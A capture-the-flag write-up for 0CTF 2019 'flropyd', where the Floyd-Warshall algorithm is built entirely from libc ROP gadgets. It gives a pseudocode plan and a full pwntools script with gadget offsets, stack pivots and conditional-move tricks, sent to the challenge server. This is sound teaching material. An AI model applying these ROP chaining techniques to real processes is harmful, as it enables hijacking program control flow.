flropyd  
============

A ~~simple~~ ROP-chaining problem.

The problem is to implement [Floyd-Warshall
Algorithm](https://en.wikipedia.org/wiki/Floyd%E2%80%93Warshall_algorithm) by
chaining appropriate ROP gadgets from given libc.\  
Since the libc binary contains thousands of gadgets, we can control almost
every registers & memory as we want to.

There are some important gadgets to make our life easier:

1. `CMOVxx`: Conditional Move. This instruction allows us to implement conditionals without the need of `jx`/`jxx` conditional jump instructions which are hard to control.  
2. `ret imm16`: return & pop from stack. This instruction allows us to use gadgets ending with `call qword ptr [r/m64]` without tainting our own ROP chain in the stack.  
3. `leave; ret` or equivalent for stack pivoting.

I started solving the challenge by finding and defining primitive gadgets &
chains, such as `pop`, `mov`, `add` and `sub`. By properly identifying the
gadgets' restrictions and side-effects, we are less likely to confront
unexpected results later on.

Then, I wrote down some ROP chain plans with the above primitive gadgets. For
example, below is my simple pseudocode which can (almost) directly be
translated to a ROP chain using predefined primitive gadgets.  
```  
mov [I] 0  
label FI2:

mov [J] 0  
label FJ2:

mov [K] 0  
label FK2:

// if (conn[j][k] > conn[j][i] + conn[i][k]) then conn[j][k] = conn[j][i] +
conn[i][k]  
mov $rax [J]  
mov [i1] $rax  
shl6 [i1]  
set $rdi dummy_writable_addr  
mov $rcx [K]  
add [i1] $rcx  
mov $rdx [i1]  
qword_get(CONN)  
mov [v1] $rax

mov $rax [J]  
mov [i2] $rax  
shl6 [i2]  
set $rdi dummy_writable_addr  
mov $rcx [I]  
add [i2] $rcx  
mov $rdx [i2]  
qword_get(CONN)  
mov [v2] $rax

mov $rax [I]  
mov [i3] $rax  
shl6 [i3]  
set $rdi dummy_writable_addr  
mov $rcx [K]  
add [i3] $rcx  
mov $rdx [i3]  
qword_get(CONN)  
mov [v3] $rax

mov $rdi [v3]  
mov [vsum] $rdi  
mov $rdi [v2]  
add [vsum] $rdi  
mov $rdx [vsum]  
mov $rdi [v1]  
mov $rax [vsum]  
sub $rax $rdi  
mov $rax [v1]  
cmovb $rax $rdx  // 0x000000000012344b : cmovb rax, rdx ; ret  
mov [res] $rax  
mov $rdi [res]  
mov $rdx [i1]  
qword_set(CONN)

// for-loop pivoting  
save_rsp()  
mov [ite] $rsi  
mov [lim] $rsi  
set $rcx to some appropriate + offset  
add [ite] $rcx  // where to jump if finished (label FK)  
mov $rax [lim]  
set $rdi to some appropriate - offset (as positive val)  
sub $rax $rdi  
mov [lim] $rax  // where to jump if not finished (label FK2)

inc [K]  
mov $rax [K]  
sub $eax [N]  // if ZF then pivot $rsp to [ite], else [lim]  
mov $rdx, [lim]  
mov $rax, [ite]  
cmovne $rax, $rdx  
mov [piv] $rax  
set $rdi 0x10  
add [piv] $rdi  
mov $rbp, [piv]  
stack_pivot()

label FK:  
(do above, now with j instead of k)

label FJ:  
(do above, now with i instead of k)

label FI:  
raise(SIGTRAP)  
```

After the above step, chaining the gadgets is trivial work. Below is the
exploit code. Note the use of `p.shutdown('send')` as this is necessary to
stop the binary from `read()`ing indefinitely.

```python  
from pwn import *

binary = ELF('./flropyd')  
libc = ELF('/home/xion/Desktop/GoN/libraries/libc-2.27.so')

p = remote('111.186.63.203', 6666)

p.recvuntil('malloc address: ')  
malloc_libc = int(p.recvline().strip(), 16)  
libc_base = malloc_libc - libc.symbols['malloc']  
assert(libc_base & 0xfff == 0)

p.recvuntil('please show me the rop chain:')

def setmem(mem, val):  # rdx, rdi  
   p  = setreg('rdx', val&0xffffffffffffffff)  
   p += setreg('rdi', mem)  
   p += p64(0x00000000000a815f + libc_base)  # mov qword ptr [rdi], rdx ; ret  
   return p

def setreg(reg, val):  # $reg  
   pop = {'rax': 0x00000000000439c8, 'rbp': 0x0000000000021353, 'rbx':
0x000000000002cb49, 'rcx': 0x000000000003eb0b,  
          'rdi': 0x000000000002155f, 'rdx': 0x0000000000001b96, 'rsi': 0x0000000000023e6a, 'rsp': 0x0000000000003960}  
   p  = p64(pop[reg] + libc_base) + p64(val&0xffffffffffffffff)  
   return p

# need to pre-set rbp  
def stack_pivot():  # rsp, rbx, r12, rbp | need 0x18 bytes after next ret @ pivot position  
   p  = p64(0x00000000000e2fd8 + libc_base)  # lea rsp, [rbp - 0x10] ; pop rbx
; pop r12 ; pop rbp ; ret  
   return p

def save_rsp():  # !rsi, r12, r13 | saved rsp address is immediately next rsp  
   p  = setreg('rax', ppr_ptr)  # pop r12 ; pop r13 ; ret  
   p += p64(0x0000000000009a98 + libc_base)  # ret 0x10  
   p += p64(0x000000000015c741 + libc_base)  # lea rsi, [rsp + 8] ; call qword
ptr [rax]  
   p += p64(0)*3  
   return p

def incmem(mem):  # rax  
   p  = setreg('rax', mem)  
   p += p64(0x0000000000118dd0 + libc_base)  # inc dword ptr [rax] ; ret  
   return p

def regmem(reg, mem):  
   if reg == 'rax':  # !rax  
       p  = setreg('rax', mem)  
       p += p64(0x0000000000145c98 + libc_base)  # mov rax, qword ptr [rax] ; ret  
   elif reg == 'rcx':  # !rcx, rsi, [rdi + [0, 8]]  
       p  = setreg('rsi', mem)  
       p += p64(0x00000000000b6920 + libc_base)  # mov rcx, qword ptr [rsi] ; mov byte ptr [rdi + 8], dh ; mov qword ptr [rdi], rcx ; ret  
   elif reg == 'rdx':  # !rdx, rax  
       p  = regmem('rax', mem)  
       p += p64(0x00000000001415dd + libc_base)  # mov rdx, rax ; ret (regmem re-called)  
   elif reg == 'rdi':  # !rdi, rax  
       p  = setreg('rdi', mem - 0x68)  
       p += p64(0x00000000000520e9 + libc_base)  # mov rdi, qword ptr [rdi + 0x68] ; xor eax, eax ; ret  
   elif reg == 'rsi':  # !rsi, rax  
       p  = setreg('rsi', mem - 0x70)  
       p += p64(0x0000000000052419 + libc_base)  # mov rsi, qword ptr [rsi + 0x70] ; xor eax, eax ; ret  
   elif reg == 'rbp':  # !rbp, rax, r12  
       p  = setreg('rax', mem - 0x5b)  
       p += setreg('rbp', 0)  
       p += p64(0x0000000000009a98 + libc_base)  # ret 0x10  
       p += p64(0x0000000000084268 + libc_base)  # push qword ptr [rbp + rax + 0x5b] ; pop rbp ; pop r12 ; ret  
       p += p64(0)*3  
   else:  
       assert(False)  
   return p

def memreg(mem, reg):  
   if reg == 'rax':  # rsi  
       p  = setreg('rsi', mem - 0x8)  
       p += p64(0x000000000014dbce + libc_base) # mov qword ptr [rsi + 8], rax ; ret  
   elif reg == 'rcx':  # rax  
       p  = setreg('rax', mem - 0x40)  
       p += p64(0x000000000008335c + libc_base)  # mov qword ptr [rax + 0x40], rcx ; ret  
   elif reg == 'rdx':  # rax  
       p  = setreg('rax', mem)  
       p += p64(0x00000000000301a4 + libc_base)  # mov qword ptr [rax], rdx ; ret)  
   elif reg == 'rdi':  # rax  
       p  = setreg('rax', mem)  
       p += p64(0x0000000000097055 + libc_base)  # mov qword ptr [rax], rdi ; ret)  
   elif reg == 'rsi':  # rbx  
       p  = setreg('rbx', mem - 0x10)  
       p += p64(0x0000000000129ef9 + libc_base) + p64(0)*3  # mov qword ptr [rbx + 0x10], rsi ; add rsp, 0x10 ; pop rbx ; ret  
   elif reg == 'rbp':  # rbx, rbp, r12  
       p  = setreg('rbx', mem - 0x60)  
       p += p64(0x000000000008fa3c + libc_base) + p64(0)*3  # mov qword ptr [rbx + 0x60], rbp ; pop rbx ; pop rbp ; pop r12 ; ret  
   else:  
       assert(False)  
   return p

def add_memreg(mem, reg):  
   if reg == 'rcx':  # rax  
       p  = setreg('rax', mem - 1)  
       p += p64(0x000000000006d29c + libc_base)  # add dword ptr [rax + 1], ecx ; ret  
   elif reg == 'rdi':  # rax  
       p  = setreg('rax', mem - 1)  
       p += p64(0x00000000000edbe0 + libc_base)  # add dword ptr [rax + 1], edi ; ret)  
   elif reg == 'rsi':  # rbp  
       p  = setreg('rbp', mem + 0x2f)  
       p += p64(0x00000000001180fc + libc_base)  # add dword ptr [rbp - 0x2f], esi ; ret)  
   else:  
       assert(False)  
   return p

def sub_regmem(reg, mem):  
   if reg == 'rax':  # !eax, rdi  
       p  = setreg('rdi', mem - 0x18)  
       p += p64(0x000000000009041e + libc_base)  # sub eax, dword ptr [rdi + 0x18] ; ret  
   else:  
       assert(False)  
   return p

def sub_regreg(r1, r2):  
   if r1 == 'rax' and r2 == 'rcx':  
       p  = p64(0x00000000000a9e4c + libc_base)  # sub eax, ecx ; ret  
   elif r1 == 'rax' and r2 == 'rdi':  
       p  = p64(0x00000000000b17b8 + libc_base)  # sub rax, rdi ; ret  
   elif r1 == 'rax' and r2 == 'rdx':  
       p  = p64(0x00000000000438fd + libc_base)  # sub rax, rdx ; ret  
   elif r1 == 'rax' and r2 == 'rsi':  
       p  = p64(0x000000000018a15c + libc_base)  # sub rax, rsi ; ret  
   elif r1 == 'rsi' and r2 == 'rbx':  
       p  = p64(0x00000000001164d4 + libc_base)  # sub esi, ebx ; ret  
   else:  
       assert(False)  
   return p

def shl6_mem(mem):  # rdi  
   p  = setreg('rdi', mem + 5)  
   p += p64(0x00000000001ab548 + libc_base)*6  # shl dword ptr [rdi - 5], 1 ;
ret  
   return p

# need to pre-set rdx (=idx)  
def qword_get(arr_addr):  # !rax, rbx  
   p  = setreg('rax', arr_addr)  
   p += p64(0x00000000000df181 + libc_base) + p64(0)*3  # lea rax, [rax +
rdx*8] ; add rsp, 0x10 ; pop rbx ; ret  
   p += p64(0x0000000000145c98 + libc_base)  # mov rax, qword ptr [rax] ; ret  
   return p

# need to pre-set rdx (=idx), rdi (=value)  
def qword_set(arr_addr):  # !rax, rbx  
   p  = setreg('rax', arr_addr)  
   p += p64(0x00000000000df181 + libc_base) + p64(0)*3  # lea rax, [rax +
rdx*8] ; add rsp, 0x10 ; pop rbx ; ret  
   p += p64(0x0000000000097055 + libc_base)  # mov qword ptr [rax], rdi ; ret)  
   return p

"""  
0x0000000000086bb1 : cmove eax, ecx ; ret  
0x00000000000300ba : cmove rax, rdx ; ret  
0x0000000000117729 : cmove rax, rbx ; pop rbx ; ret

0x000000000009a7d9 : cmovne rax, rcx ; ret  
0x00000000000a0b1e : cmovne rax, rdi ; ret  
0x000000000009d7b9 : cmovne rax, rdx ; ret  
0x000000000012bec3 : cmovne eax, esi ; ret

0x0000000000114d58 : cmova eax, edx ; ret  
0x0000000000141242 : cmovae eax, edi ; ret  
0x00000000000586a8 : cmovb rax, rdi ; ret  
0x000000000012344b : cmovb rax, rdx ; ret  
0x000000000009d998 : cmovbe eax, edx ; ret  
0x00000000000bd09a : cmovg eax, edx ; ret  
0x00000000001163d8 : cmovns eax, edx ; ret  
0x0000000000024f3c : cmovs eax, edx ; ret  
"""

N = 0x0000000000602060  
CONN = 0x0000000000602068  
FREE = 0x000000000061A080

I = FREE + 0x10  
J = FREE + 0x20  
K = FREE + 0x30  
i1 = FREE + 0x40  
i2 = FREE + 0x50  
i3 = FREE + 0x60  
v1 = FREE + 0x70  
v2 = FREE + 0x80  
v3 = FREE + 0x90  
vsum = FREE + 0xa0  
res = FREE + 0xb0  
ite = FREE + 0xc0  
lim = FREE + 0xd0  
piv = FREE + 0xe0  
DUMMY = FREE + 0x200  
ppr_ptr = FREE + 0x400

pl = ''  
pl += p64(0)*3

pl += setmem(ppr_ptr, 0x0000000000021a43 + libc_base)

pl += setmem(I, 0)  
lbl_FI2 = len(pl)  
pl += p64(0x00000000000008aa + libc_base)*3

pl += setmem(J, 0)  
lbl_FJ2 = len(pl)  
pl += p64(0x00000000000008aa + libc_base)*3

pl += setmem(K, 0)  
lbl_FK2 = len(pl)  
pl += p64(0x00000000000008aa + libc_base)*3

pl += regmem('rax', J)  
pl += memreg(i1, 'rax')  
pl += shl6_mem(i1)  
pl += setreg('rdi', DUMMY)  
pl += regmem('rcx', K)  
pl += add_memreg(i1, 'rcx')  
pl += regmem('rdx', i1)  
pl += qword_get(CONN)  
pl += memreg(v1, 'rax')

pl += regmem('rax', J)  
pl += memreg(i2, 'rax')  
pl += shl6_mem(i2)  
pl += setreg('rdi', DUMMY)  
pl += regmem('rcx', I)  
pl += add_memreg(i2, 'rcx')  
pl += regmem('rdx', i2)  
pl += qword_get(CONN)  
pl += memreg(v2, 'rax')

pl += regmem('rax', I)  
pl += memreg(i3, 'rax')  
pl += shl6_mem(i3)  
pl += setreg('rdi', DUMMY)  
pl += regmem('rcx', K)  
pl += add_memreg(i3, 'rcx')  
pl += regmem('rdx', i3)  
pl += qword_get(CONN)  
pl += memreg(v3, 'rax')

pl += regmem('rdi', v3)  
pl += memreg(vsum, 'rdi')  
pl += regmem('rdi', v2)  
pl += add_memreg(vsum, 'rdi')  
pl += regmem('rdx', vsum)  
pl += regmem('rdi', v1)  
pl += regmem('rax', vsum)  
pl += sub_regreg('rax', 'rdi')  
pl += regmem('rax', v1)  
pl += p64(0x000000000012344b + libc_base)  # cmovb rax, rdx ; ret  
pl += memreg(res, 'rax')  
pl += regmem('rdi', res)  
pl += regmem('rdx', i1)  
pl += qword_set(CONN)

pl += save_rsp()  
lbl_FK_base = len(pl)  
pl += memreg(ite, 'rsi')  
pl += memreg(lim, 'rsi')  
pl += setreg('rcx', 0x1e8)  
pl += add_memreg(ite, 'rcx')  
pl += regmem('rax', lim)  
pl += setreg('rdi', lbl_FK_base - lbl_FK2)  
pl += sub_regreg('rax', 'rdi')  
pl += memreg(lim, 'rax')

pl += incmem(K)  
pl += regmem('rax', K)  
pl += sub_regmem('rax', N)  
pl += regmem('rdx', lim)  
pl += regmem('rax', ite)  
pl += p64(0x000000000009d7b9 + libc_base)  # cmovne rax, rdx ; ret  
pl += memreg(piv, 'rax')  
pl += setreg('rdi', 0x10)  
pl += add_memreg(piv, 'rdi')  
pl += regmem('rbp', piv)  
pl += stack_pivot()

lbl_FK = len(pl)  
pl += p64(0x00000000000008aa + libc_base)*3

pl += save_rsp()  
lbl_FJ_base = len(pl)  
pl += memreg(ite, 'rsi')  
pl += memreg(lim, 'rsi')  
pl += setreg('rcx', 0x1e8)  
pl += add_memreg(ite, 'rcx')  
pl += regmem('rax', lim)  
pl += setreg('rdi', lbl_FJ_base - lbl_FJ2)  
pl += sub_regreg('rax', 'rdi')  
pl += memreg(lim, 'rax')

pl += incmem(J)  
pl += regmem('rax', J)  
pl += sub_regmem('rax', N)  
pl += regmem('rdx', lim)  
pl += regmem('rax', ite)  
pl += p64(0x000000000009d7b9 + libc_base)  # cmovne rax, rdx ; ret  
pl += memreg(piv, 'rax')  
pl += setreg('rdi', 0x10)  
pl += add_memreg(piv, 'rdi')  
pl += regmem('rbp', piv)  
pl += stack_pivot()

lbl_FJ = len(pl)  
pl += p64(0x00000000000008aa + libc_base)*3

pl += save_rsp()  
lbl_FI_base = len(pl)  
pl += memreg(ite, 'rsi')  
pl += memreg(lim, 'rsi')  
pl += setreg('rcx', 0x1e8)  
pl += add_memreg(ite, 'rcx')  
pl += regmem('rax', lim)  
pl += setreg('rdi', lbl_FI_base - lbl_FI2)  
pl += sub_regreg('rax', 'rdi')  
pl += memreg(lim, 'rax')

pl += incmem(I)  
pl += regmem('rax', I)  
pl += sub_regmem('rax', N)  
pl += regmem('rdx', lim)  
pl += regmem('rax', ite)  
pl += p64(0x000000000009d7b9 + libc_base)  # cmovne rax, rdx ; ret  
pl += memreg(piv, 'rax')  
pl += setreg('rdi', 0x10)  
pl += add_memreg(piv, 'rdi')  
pl += regmem('rbp', piv)  
pl += stack_pivot()

lbl_FI = len(pl)  
pl += p64(0x00000000000008aa + libc_base)*3  
pl += setreg('rdi', 5)  
pl += p64(libc_base + libc.symbols['raise'])  # raise(SIGTRAP)

print(hex(lbl_FI - lbl_FI_base), hex(lbl_FJ - lbl_FJ_base), hex(lbl_FK -
lbl_FK_base))  
print(hex(len(pl)))

p.send(pl)

p.shutdown('send')

p.interactive()  
```

Original writeup
(https://github.com/leesh3288/CTF/blob/master/2019/0CTF_Quals/flropyd/flropyd_writeup.md).